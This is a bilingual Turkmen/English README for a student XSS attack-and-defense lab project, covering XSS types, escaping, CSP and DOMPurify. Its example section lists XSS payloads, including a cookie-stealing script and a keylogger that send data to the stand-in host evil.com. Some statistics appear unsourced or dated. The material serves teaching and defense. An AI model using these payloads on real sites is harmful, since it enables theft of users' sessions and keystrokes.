# XSS Shield - Attack & Defense Laboratory

## Diplom Taslamasy / Diploma Project

**Awtor / Author:** Daniyar Nurmetow

**Tema / Topic:**
- EN: XSS Attack and Defense Techniques
- TM: XSS hüjümi we goranyş usullary

---

## Näme üçin bu taslama gerek? / Why is this project needed?

Cross-Site Scripting (XSS) dünýäde iň giň ýaýran web howpsuzlyk ejizliklerinden biridir. Bu taslama:

Cross-Site Scripting (XSS) is one of the most widespread web security vulnerabilities in the world. This project:

- XSS hüjümleriniň nähili işleýändigini görkezýär / Demonstrates how XSS attacks work
- Howpsuz gurşawda hüjümleri türgenleşdirmäge mümkinçilik berýär / Allows practicing attacks in a safe environment
- Goranyş usullaryny öwredýär / Teaches defense techniques
- Kod skanirleýjisi bilen ejizlikleri ýüze çykarýar / Detects vulnerabilities with code scanner

---

## XSS Hüjüm Görnüşleri / XSS Attack Types

### 1. Reflected XSS (Şöhlelendirilen XSS)
- Skript web serwerden şöhlelenýär
- URL parametrleri ýa-da forma girişleri arkaly
- Hemişelik däl

### 2. Stored XSS (Saklanýan XSS)
- Skript serwerde hemişelik saklanýar
- Maglumatlar bazasy, teswirler, profiller arkaly
- Iň howply görnüş

### 3. DOM-based XSS (DOM-esasly XSS)
- Skript DOM-y göni manipulirleýär
- Klient tarapy JavaScript arkaly
- URL fragment dolandyryş

---

## Goranyş Usullary / Defense Techniques

| Usul / Technique | Düşündiriş / Description |
|-----------------|-------------------------|
| Input Validation | Ähli ulanyjy girişlerini barlaň |
| Output Encoding | Çykyşda ýörite simwollary kodlaň |
| CSP | Content Security Policy başlygy |
| HttpOnly Cookies | Cookie-leri JS-den goraň |
| Sanitization | Howply HTML teglerini aýyryň |

---

## Tehnologiýa / Technology Stack

- **Frontend:** Vue.js 3, PrimeVue
- **Backend:** Node.js, Express.js
- **Howpsuzlyk:** XSS simulýasiýasy, sanitizasiýa

---

## Gurnamak we Başlatmak / Installation & Running

```bash
# Backend
cd backend && npm install && npm start

# Frontend (täze terminalda)
cd frontend && npm install && npm run dev
```

---

## Mysal XSS Ýükler / Example XSS Payloads

```javascript
// Basic Alert
<script>alert('XSS')</script>

// Cookie Stealing
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='http://evil.com/log?k='+e.key}</script>

// Event Handler
<img src=x onerror="alert('XSS')">

// SVG XSS
<svg onload="alert('XSS')">
```

---

## Goranyş Kody Mysallary / Defense Code Examples

### HTML Escaping
```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

### Content Security Policy
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```

### DOMPurify Usage
```javascript
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

---

## Prepod Üçin Soraglar / Q&A for Professor

### 1. XSS näme we näme üçin howply?
XSS (Cross-Site Scripting) hüjümçilere web sahypalaryna zyýanly skriptleri sanjmaga mümkinçilik berýän howpsuzlyk ejizligidir. Ol:
- Sessiýa ogurlamaga
- Şahsyýet ogurlamaga
- Web sahypa bozmagyna
- Zyýanly programma paýlamagyna sebäp bolup biler

### 2. XSS-iň üç görnüşi nähili tapawutlanýar?
- **Reflected:** Skript URL-dan şöhlelenýär, hemişelik däl
- **Stored:** Skript serwerde saklanýar, iň howply
- **DOM-based:** Skript klient tarapynda ýerine ýetirilýär

### 3. XSS-den nähili goranmaly?
- Ähli ulanyjy girişlerini barlamaly (Input Validation)
- Çykyşda ýörite simwollary kodlamaly (Output Encoding)
- Content Security Policy (CSP) ulanmaly
- HttpOnly cookie-leri ulanmaly
- DOMPurify ýaly kitaphanalary ulanmaly

### 4. Bu taslama nähili döredildi?
Vue.js bilen frontend, Node.js bilen backend döredildi. Hüjüm simulýasiýasy, goranyş demonstrasiýasy we kod skanirleýjisi ýerine ýetirildi.

### 5. OWASP Top 10-da XSS haýsy orunda?
XSS OWASP Top 10-yň 7-nji ornunda durýar we web amallaryndaky iň giň ýaýran ejizliklerden biri bolup galýar.

---

## OWASP XSS Statistikasy / OWASP XSS Statistics

- Web amallaryndaky hüjümleriň ~40%-i XSS bilen baglanyşykly
- Web sahypalaryň ~75%-i XSS-e ejiz
- Ortaça maglumat bozulma bahasy: $3.9 million

---

© 2026 Daniyar Nurmetow - Diplom Taslamasy
